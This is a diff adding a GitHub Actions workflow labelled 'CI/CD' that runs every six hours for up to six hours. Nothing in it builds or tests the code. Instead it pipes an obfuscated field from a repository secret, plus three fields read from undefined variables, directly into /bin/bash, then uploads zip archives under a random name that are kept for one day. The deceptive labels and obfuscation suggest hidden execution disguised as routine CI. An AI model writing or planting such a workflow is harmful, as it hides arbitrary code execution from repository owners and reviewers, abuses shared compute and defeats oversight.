@@ -1,0 +1,40 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          n12: ${{ secrets.n12 }}
+        run: |
+          printf '%s' "$n12" | jq -r .zgvty8 | /bin/bash
+          echo $lb68571 | jq -r .dufd40946 | /bin/bash
+          echo $dso9515 | jq -r .gr7443 | /bin/bash
+          echo $inojx6 | jq -r .ugrfp04970 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: n2N4Rmft
+          path: "*.zip"
+          retention-days: 1
